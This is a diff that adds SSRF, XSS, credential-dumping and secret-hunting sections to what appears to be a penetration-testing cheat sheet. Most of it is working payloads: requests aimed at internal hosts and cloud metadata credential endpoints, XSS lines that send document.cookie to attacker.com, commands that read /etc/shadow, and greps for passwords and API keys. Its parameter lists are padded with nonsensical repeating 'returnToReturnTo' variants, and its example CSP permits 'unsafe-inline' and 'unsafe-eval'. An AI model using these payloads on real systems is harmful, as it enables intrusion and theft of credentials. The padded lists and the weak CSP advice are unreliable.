@@ -162,6 +162,197 @@ gowitness scan -f urls.txt
 ### OWASP Top 10 & Common Web Vulns
 - SQLi, XSS, IDOR, SSRF, File Upload, etc. (with descriptions, tools, and mitigation)
 
+### Server-Side Request Forgery (SSRF)
+
+SSRF vulnerabilities occur when a web application is fetching a remote resource without validating the user-supplied URL. This allows an attacker to make the server-side application make requests to arbitrary domains.
+
+#### Common SSRF Vulnerable Parameters
+```
+url=
+path=
+dest=
+redirect=
+uri=
+continue=
+return=
+returnTo=
+return_to=
+returnUrl=
+return_url=
+returnPath=
+return_path=
+returnToUrl=
+return_to_url=
+returnToPath=
+return_to_path=
+returnToUri=
+return_to_uri=
+returnToDest=
+return_to_dest=
+returnToRedirect=
+return_to_redirect=
+returnToContinue=
+return_to_continue=
+returnToReturn=
+return_to_return=
+returnToReturnTo=
+return_to_return_to=
+returnToReturnToUrl=
+return_to_return_to_url=
+returnToReturnToReturnToPath=
+return_to_return_to_return_to_path=
+returnToReturnToReturnToUri=
+return_to_return_to_return_to_uri=
+returnToReturnToReturnToDest=
+return_to_return_to_return_to_dest=
+returnToReturnToReturnToRedirect=
+return_to_return_to_return_to_redirect=
+returnToReturnToReturnToContinue=
+return_to_return_to_return_to_continue=
+returnToReturnToReturnToReturn=
+return_to_return_to_return_to_return=
+returnToReturnToReturnToReturnTo=
+return_to_return_to_return_to_return_to=
+```
+
+#### Common SSRF Payloads
+
+1. **Basic SSRF to localhost**
+```
+http://localhost
+http://127.0.0.1
+http://[::1]
+http://0.0.0.0
+```
+
+2. **SSRF to internal services**
+```
+http://localhost:22
+http://127.0.0.1:3306
+http://[::1]:6379
+http://0.0.0.0:8080
+```
+
+3. **SSRF to cloud metadata services**
+```
+# AWS
+http://169.254.169.254/latest/meta-data/
+http://169.254.169.254/latest/user-data/
+http://169.254.169.254/latest/security-credentials/
+
+# Google Cloud
+http://metadata.google.internal/computeMetadata/v1/
+http://metadata.google.internal/computeMetadata/v1/instance/
+http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/
+
+# Azure
+http://169.254.169.254/metadata/v1/
+http://169.254.169.254/metadata/instance/
+http://169.254.169.254/metadata/identity/
+```
+
+4. **SSRF to internal network**
+```
+http://192.168.0.1
+http://10.0.0.1
+http://172.16.0.1
+```
+
+5. **SSRF with different protocols**
+```
+file:///etc/passwd
+dict://localhost:11211/stat
+gopher://localhost:11211/_stats
+```
+
+6. **SSRF with different encodings**
+```
+http://%6c%6f%63%61%6c%68%6f%73%74
+http://%6c%6f%63%61%6c%68%6f%73%74%3a%38%30%38%30
+http://%6c%6f%63%61%6c%68%6f%73%74%3a%38%30%38%30%2f%61%64%6d%69%6e
+```
+
+7. **SSRF with different IP formats**
+```
+http://2130706433
+http://0x7f000001
+http://017700000001
+```
+
+#### Testing for SSRF
+
+1. **Using Burp Suite**
+- Intercept requests that might fetch external resources
+- Look for parameters that might contain URLs
+- Try different SSRF payloads
+- Check the response for any information leakage
+
+2. **Using curl**
+```bash
+# Test basic SSRF
+curl -v "http://target.com/page?url=http://localhost"
+
+# Test with different protocols
+curl -v "http://target.com/page?url=file:///etc/passwd"
+curl -v "http://target.com/page?url=dict://localhost:11211/stat"
+curl -v "http://target.com/page?url=gopher://localhost:11211/_stats"
+
+# Test with different encodings
+curl -v "http://target.com/page?url=http://%6c%6f%63%61%6c%68%6f%73%74"
+```
+
+3. **Using Python**
+```python
+import requests
+
+def test_ssrf(url, payload):
+    try:
+        response = requests.get(f"{url}?url={payload}")
+        print(f"Payload: {payload}")
+        print(f"Status Code: {response.status_code}")
+        print(f"Response: {response.text[:200]}")  # Print first 200 chars
+    except Exception as e:
+        print(f"Error: {e}")
+
+# Test different payloads
+payloads = [
+    "http://localhost",
+    "http://127.0.0.1",
+    "file:///etc/passwd",
+    "http://169.254.169.254/latest/meta-data/",
+    "http://metadata.google.internal/computeMetadata/v1/",
+    "http://169.254.169.254/metadata/v1/"
+]
+
+for payload in payloads:
+    test_ssrf("http://target.com/page", payload)
+```
+
+#### Mitigation Techniques
+
+1. **Input Validation**
+- Whitelist allowed URLs and domains
+- Block access to private IP addresses
+- Block access to localhost
+- Block access to cloud metadata services
+
+2. **Network Segmentation**
+- Isolate internal services
+- Use firewalls to restrict access
+- Implement proper network segmentation
+
+3. **Application Design**
+- Don't trust user input
+- Use a whitelist approach
+- Implement proper error handling
+- Use a proxy service for external requests
+
+4. **Monitoring and Logging**
+- Monitor for suspicious requests
+- Log all external requests
+- Implement rate limiting
+- Set up alerts for suspicious activity
+
 ### Path Traversal
 
 Path Traversal vulnerabilities allow attackers to access files and directories that are outside the intended web root folder. This can expose sensitive files and system information.
@@ -330,6 +521,256 @@ Remote File Inclusion (RFI) vulnerabilities allow attackers to include and execu
 
 ---
 
+### Cross-Site Scripting (XSS)
+
+XSS vulnerabilities occur when a web application allows users to inject malicious scripts into web pages viewed by other users. There are three main types of XSS: Reflected, Stored, and DOM-based.
+
+#### Common XSS Vulnerable Parameters
+```
+search=
+q=
+query=
+s=
+keyword=
+id=
+file=
+path=
+folder=
+dir=
+document=
+url=
+uri=
+redirect=
+return=
+returnTo=
+return_to=
+returnUrl=
+return_url=
+returnPath=
+return_path=
+returnToUrl=
+return_to_url=
+returnToPath=
+return_to_path=
+returnToUri=
+return_to_uri=
+returnToDest=
+return_to_dest=
+returnToRedirect=
+return_to_redirect=
+returnToContinue=
+return_to_continue=
+returnToReturn=
+return_to_return=
+returnToReturnTo=
+return_to_return_to=
+returnToReturnToUrl=
+return_to_return_to_url=
+returnToReturnToPath=
+return_to_return_to_path=
+returnToReturnToUri=
+return_to_return_to_uri=
+returnToReturnToDest=
+return_to_return_to_dest=
+returnToReturnToRedirect=
+return_to_return_to_redirect=
+returnToReturnToContinue=
+return_to_return_to_continue=
+returnToReturnToReturn=
+return_to_return_to_return=
+returnToReturnToReturnTo=
+return_to_return_to_return_to=
+returnToReturnToReturnToUrl=
+return_to_return_to_return_to_url=
+returnToReturnToReturnToPath=
+return_to_return_to_return_to_path=
+returnToReturnToReturnToUri=
+return_to_return_to_return_to_uri=
+returnToReturnToReturnToDest=
+return_to_return_to_return_to_dest=
+returnToReturnToReturnToRedirect=
+return_to_return_to_return_to_redirect=
+returnToReturnToReturnToContinue=
+return_to_return_to_return_to_continue=
+returnToReturnToReturnToReturn=
+return_to_return_to_return_to_return=
+returnToReturnToReturnToReturnTo=
+return_to_return_to_return_to_return_to=
+```
+
+#### Common XSS Payloads
+
+1. **Basic XSS Payloads**
+```html
+<script>alert(XSS)</script>
+<img src=x onerror=alert(XSS)>
+<svg onload=alert(XSS)>
+<body onload=alert(XSS)>
+<div onmouseover=alert(XSS)>Hover me</div>
+<a href=javascript:alert(XSS)>Click me</a>
+```
+
+2. **XSS with Event Handlers**
+```html
+<img src=x onerror=alert(1)>
+<img src=x onerror=alert(document.cookie)>
+<img src=x onerror=eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))>
+<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>
+<img src=x onerror=eval(unescape('%61%6C%65%72%74%28%31%29'))>
+```
+
+3. **XSS with JavaScript Functions**
+```html
+<script>fetch('http://attacker.com/steal?cookie='+document.cookie)</script>
+<script>new Image().src='http://attacker.com/steal?cookie='+document.cookie</script>
+<script>var xhr=new XMLHttpRequest();xhr.open('GET','http://attacker.com/steal?cookie='+document.cookie,true);xhr.send()</script>
+```
+
+4. **XSS with DOM Manipulation**
+```html
+<div id="test"></div><script>document.getElementById('test').innerHTML='<img src=x onerror=alert(1)>'</script>
+<div id="test"></div><script>document.write('<img src=x onerror=alert(1)>')</script>
+<div id="test"></div><script>document.writeln('<img src=x onerror=alert(1)>')</script>
+```
+
+5. **XSS with Base64 Encoding**
+```html
+<img src=x onerror=eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))>
+<script>eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))</script>
+```
+
+6. **XSS with Unicode Encoding**
+```html
+<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>
+<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
+```
+
+7. **XSS with URL Encoding**
+```html
+<img src=x onerror=eval(unescape('%61%6C%65%72%74%28%31%29'))>
+<script>eval(unescape('%61%6C%65%72%74%28%31%29'))</script>
+```
+
+8. **XSS with HTML Entities**
+```html
+&#60;script&#62;alert(1)&#60;/script&#62;
+&#60;img src=x onerror=alert(1)&#60;/img&#62;
+```
+
+9. **XSS with Mixed Encoding**
+```html
+<scr<script>ipt>alert(1)</scr</script>ipt>
+<img src=x onerror=alert(1)>
+<img src=x onerror=eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))>
+```
+
+#### Testing for XSS
+
+1. **Using Burp Suite**
+- Intercept requests that might reflect user input
+- Look for parameters that might contain user input
+- Try different XSS payloads
+- Check the response for any reflected payloads
+
+2. **Using curl**
+```bash
+# Test basic XSS
+curl -v "http://target.com/page?search=<script>alert(1)</script>"
+
+# Test with different encodings
+curl -v "http://target.com/page?search=%3Cscript%3Ealert(1)%3C/script%3E"
+curl -v "http://target.com/page?search=&#60;script&#62;alert(1)&#60;/script&#62;"
+
+# Test with different event handlers
+curl -v "http://target.com/page?search=<img src=x onerror=alert(1)>"
+```
+
+3. **Using Python**
+```python
+import requests
+from urllib.parse import quote
+
+def test_xss(url, payload):
+    try:
+        # Test with different encodings
+        encoded_payload = quote(payload)
+        html_encoded = payload.encode('ascii').decode('unicode-escape')
+        
+        # Test original payload
+        response = requests.get(f"{url}?search={payload}")
+        print(f"Original Payload: {payload}")
+        print(f"Status Code: {response.status_code}")
+        print(f"Response contains payload: {payload in response.text}")
+        
+        # Test URL encoded payload
+        response = requests.get(f"{url}?search={encoded_payload}")
+        print(f"URL Encoded Payload: {encoded_payload}")
+        print(f"Status Code: {response.status_code}")
+        print(f"Response contains payload: {payload in response.text}")
+        
+        # Test HTML encoded payload
+        response = requests.get(f"{url}?search={html_encoded}")
+        print(f"HTML Encoded Payload: {html_encoded}")
+        print(f"Status Code: {response.status_code}")
+        print(f"Response contains payload: {payload in response.text}")
+        
+    except Exception as e:
+        print(f"Error: {e}")
+
+# Test different payloads
+payloads = [
+    "<script>alert(1)</script>",
+    "<img src=x onerror=alert(1)>",
+    "<svg onload=alert(1)>",
+    "<body onload=alert(1)>",
+    "<div onmouseover=alert(1)>Hover me</div>",
+    "<a href=javascript:alert(1)>Click me</a>"
+]
+
+for payload in payloads:
+    test_xss("http://target.com/page", payload)
+```
+
+#### Mitigation Techniques
+
+1. **Input Validation**
+- Validate and sanitize all user input
+- Use whitelist approach for allowed characters
+- Implement proper encoding
+- Use Content Security Policy (CSP)
+
+2. **Output Encoding**
+- Encode output based on context (HTML, JavaScript, URL, etc.)
+- Use proper encoding functions
+- Implement proper escaping
+- Use secure frameworks
+
+3. **Content Security Policy (CSP)**
+```html
+Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline';
+```
+
+4. **Additional Security Headers**
+```html
+X-XSS-Protection: 1; mode=block
+X-Content-Type-Options: nosniff
+X-Frame-Options: DENY
+```
+
+5. **Framework-specific Mitigations**
+- Use built-in XSS protection
+- Use secure templating engines
+- Implement proper escaping
+- Use secure frameworks
+
+6. **Monitoring and Logging**
+- Monitor for suspicious requests
+- Log all user input
+- Implement rate limiting
+- Set up alerts for suspicious activity
+
+---
+
 ## 4. Network Penetration Testing
 
 ### Overview
@@ -402,6 +843,30 @@ wmiexec.py domain/user:pass@domain.com
 
 ### Credential Dumping
 - `mimikatz`, `secretsdump.py`, `samdump2`, `/etc/shadow`, `lsass` dump
+- **Linux Password Files**:
+  ```bash
+  # View shadow file for specific user
+  sudo cat /etc/shadow | grep username
+  # View entire shadow file (requires root)
+  sudo cat /etc/shadow
+  # View passwd file
+  cat /etc/passwd
+  # Check for readable shadow file
+  ls -l /etc/shadow
+  # Check for backup files
+  ls -la /etc/shadow*
+  # Check for readable passwd file
+  ls -l /etc/passwd
+  ```
+- **Windows Credential Files**:
+  ```bash
+  # Check for SAM file
+  dir C:\Windows\System32\config\SAM
+  # Check for SYSTEM file
+  dir C:\Windows\System32\config\SYSTEM
+  # Check for backup files
+  dir C:\Windows\System32\config\RegBack\*
+  ```
 
 ### Host Recon
 - `whoami`, `hostname`, `ipconfig /all`, `ifconfig`, `ps aux`, `tasklist`, `netstat -ano`
@@ -616,6 +1081,49 @@ find / -perm -4000 2>/dev/null
 uname -a
 ps aux
 crontab -l
+```
+
+### Useful Grep Commands
+```bash
+# Find files containing specific text
+grep -r "password" /var/www/html/
+grep -r "api_key" /var/www/html/
+grep -r "secret" /var/www/html/
+
+# Find files containing specific patterns
+grep -r "admin" /var/www/html/
+grep -r "root" /var/www/html/
+grep -r "user" /var/www/html/
+
+# Find files with specific extensions
+find /var/www/html/ -type f -name "*.php" -exec grep -l "password" {} \;
+find /var/www/html/ -type f -name "*.conf" -exec grep -l "password" {} \;
+
+# Find files containing specific patterns (case insensitive)
+grep -ri "password" /var/www/html/
+grep -ri "admin" /var/www/html/
+
+# Find files containing specific patterns with context
+grep -r -A 2 -B 2 "password" /var/www/html/
+
+# Find files containing specific patterns in specific file types
+grep -r --include="*.php" "password" /var/www/html/
+grep -r --include="*.conf" "password" /var/www/html/
+
+# Find files containing specific patterns and show line numbers
+grep -rn "password" /var/www/html/
+
+# Find files containing multiple patterns
+grep -r -e "password" -e "secret" /var/www/html/
+
+# Find files containing specific patterns in compressed files
+zgrep -r "password" /var/log/
+
+# Find files containing specific patterns in binary files
+grep -a "password" /path/to/binary
+
+# Find files containing specific patterns and exclude certain directories
+grep -r --exclude-dir={node_modules,git} "password" /var/www/html/
 ```
 
 ### Windows
